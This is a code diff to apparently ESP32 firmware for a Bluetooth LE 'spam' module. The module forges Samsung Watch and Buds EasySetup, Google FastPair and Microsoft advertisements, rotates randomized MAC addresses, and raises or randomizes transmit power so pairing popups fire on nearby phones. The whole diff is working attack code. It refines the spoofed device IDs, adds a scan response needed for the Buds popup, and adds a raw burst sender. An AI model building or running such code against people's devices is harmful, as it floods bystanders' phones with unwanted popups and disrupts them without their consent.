@@ -17,20 +17,27 @@ namespace {
 static NimBLEAdvertising* s_adv         = nullptr;
 static int8_t             s_advTxPower  = 0;
 
-// Samsung Watch model IDs (EasySetup)
+// Samsung Watch model IDs (EasySetup) — Watch4/5/6 from Marauder/simondankelmann
 static const uint8_t watch_models[] = {
-    0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,
-    0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x70,0x71,0x72,0x73,
-    0x74,0x75,0x76,0x77,0x78,0x79
+    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
+    0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
+    0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20
 };
 
 // Samsung Buds model IDs (EasySetup) — from simondankelmann/Bluetooth-LE-Spam
 static const uint8_t buds_models[][3] = {
     {0xEE,0x7A,0x0C},{0x9D,0x17,0x00},{0x39,0xEA,0x48},{0xA7,0xC6,0x2C},
     {0x85,0x01,0x16},{0x3D,0x8F,0x41},{0x3B,0x6D,0x02},{0xAE,0x06,0x3C},
-    {0x4C,0xBC,0x0A},{0x00,0x00,0x00},{0xB1,0x5A,0x03},{0xDB,0x96,0x00},
-    {0x84,0x61,0x00},{0x0E,0xB4,0x0B},{0xFA,0x61,0x00},{0xA3,0xB4,0x0B},
-    {0x9C,0xE8,0x0A},{0x01,0x26,0x00},{0x8A,0x87,0x00},{0x0F,0x09,0x01},
+    {0xB8,0xB9,0x05},{0xEA,0xAA,0x17},{0xD3,0x07,0x04},{0x9D,0xB0,0x06},
+    {0x10,0x1F,0x1A},{0x85,0x96,0x08},{0x8E,0x45,0x03},{0x2C,0x67,0x40},
+    {0x3F,0x67,0x18},{0x42,0xC5,0x19},{0xAE,0x07,0x3A},{0x01,0x17,0x16},
+};
+
+// Samsung Buds scan response (18 bytes) — required for EasySetup Buds popup
+static const uint8_t buds_sr[18] = {
+    0x11, 0xFF, 0x75, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
 // Google FastPair debug IDs (fire on any Android without Developer Mode)
@@ -71,6 +78,20 @@ static void bleSpamInit() {
     s_adv->setMaxInterval(0x20);
     s_adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
     s_adv->enableScanResponse(false);
+}
+
+static void sendBurstRaw(const uint8_t* buf, size_t len) {
+    for (uint8_t n = 0; n < 6; n++) {
+        uint8_t rmac[6];
+        randMac(rmac);
+        NimBLEDevice::setOwnAddr(rmac);
+        NimBLEAdvertisementData ad;
+        ad.addData(buf, len);
+        s_adv->setAdvertisementData(ad);
+        s_adv->start();
+        delay(40);
+        s_adv->stop();
+    }
 }
 
 static void sendBurst(const uint8_t* buf, size_t len) {
@@ -214,19 +235,40 @@ static void spamSamsungWatch() {
         0x01, 0x01, 0xFF, 0x00,
         0x00, 0x43, model
     };
+    // Clear any scan response left over from a previous Buds call
+    NimBLEAdvertisementData empty_sr;
+    s_adv->setScanResponseData(empty_sr);
     sendBurst(buf, sizeof(buf));
 }
 
 static void spamSamsungBuds() {
     uint8_t idx = esp_random() % (sizeof(buds_models)/sizeof(buds_models[0]));
-    uint8_t buf[] = {
-        14, 0xFF, 0x75, 0x00,
-        0x01, 0x00, 0x02, 0x00,
-        0x01, 0x02,
-        buds_models[idx][0], buds_models[idx][1], buds_models[idx][2],
-        0x43, 0x00
-    };
-    sendBurst(buf, sizeof(buf));
+    const uint8_t* id = buds_models[idx];
+    uint8_t raw[28];
+    uint8_t p = 0;
+    raw[p++] = 27; raw[p++] = 0xFF;
+    raw[p++] = 0x75; raw[p++] = 0x00;
+    raw[p++] = 0x42; raw[p++] = 0x09; raw[p++] = 0x81; raw[p++] = 0x02; raw[p++] = 0x14;
+    raw[p++] = 0x15; raw[p++] = 0x03; raw[p++] = 0x21; raw[p++] = 0x01; raw[p++] = 0x09;
+    raw[p++] = id[0]; raw[p++] = id[1]; raw[p++] = 0x01; raw[p++] = id[2];
+    raw[p++] = 0x06; raw[p++] = 0x3C; raw[p++] = 0x94; raw[p++] = 0x8E; raw[p++] = 0x00;
+    raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0xC7; raw[p++] = 0x00;
+
+    NimBLEAdvertisementData sr;
+    sr.addData(buds_sr, sizeof(buds_sr));
+
+    for (uint8_t n = 0; n < 6; n++) {
+        uint8_t rmac[6];
+        randMac(rmac);
+        NimBLEDevice::setOwnAddr(rmac);
+        NimBLEAdvertisementData ad;
+        ad.addData(raw, sizeof(raw));
+        s_adv->setScanResponseData(sr);
+        s_adv->setAdvertisementData(ad);
+        s_adv->start();
+        delay(40);
+        s_adv->stop();
+    }
 }
 
 static void spamSamsung() {
@@ -248,12 +290,14 @@ static void spamGoogle() {
     }
     uint8_t di = esp_random() % count;
     uint8_t m0=tbl[di][0], m1=tbl[di][1], m2=tbl[di][2];
+    // TX power randomized -60..+5 dBm (Marauder parity: keeps path_loss low → popup fires)
+    int8_t txpwr = (int8_t)(-60 + (int)(esp_random() % 66));
     uint8_t buf[] = {
-        0x02, 0x01, 0x06,
         0x03, 0x03, 0x2C, 0xFE,
         0x06, 0x16, 0x2C, 0xFE, m0, m1, m2,
+        0x02, 0x0A, (uint8_t)txpwr,
     };
-    sendBurst(buf, sizeof(buf));
+    sendBurstRaw(buf, sizeof(buf));
 }
 
 static void spamMicrosoft() {
@@ -278,6 +322,7 @@ void bleNativeTask(void* arg) {
     uint32_t lastReport = millis();
 
     while (self->isRunning()) {
+        applyMaxTxPower();
         s_advTxPower = self->getAdvTxPower();
         BleSpamType t = self->getType();
         switch (t) {
@@ -345,10 +390,12 @@ void BleSpamModule::stop() {
 void BleSpamModule::onEvent(uint8_t ev) {
     int8_t v = static_cast<int8_t>(advTxPower_.load());
     if (ev == static_cast<uint8_t>(encoder::EVENT_RIGHT)) {
-        if (v < 100) v += 10;
+        if (v < 127) v += 10;
+        if (v > 127) v = 127;
         advTxPower_.store(static_cast<uint8_t>(v));
     } else if (ev == static_cast<uint8_t>(encoder::EVENT_LEFT)) {
-        if (v > -100) v -= 10;
+        if (v > -127) v -= 10;
+        if (v < -127) v = -127;
         advTxPower_.store(static_cast<uint8_t>(v));
     }
 }
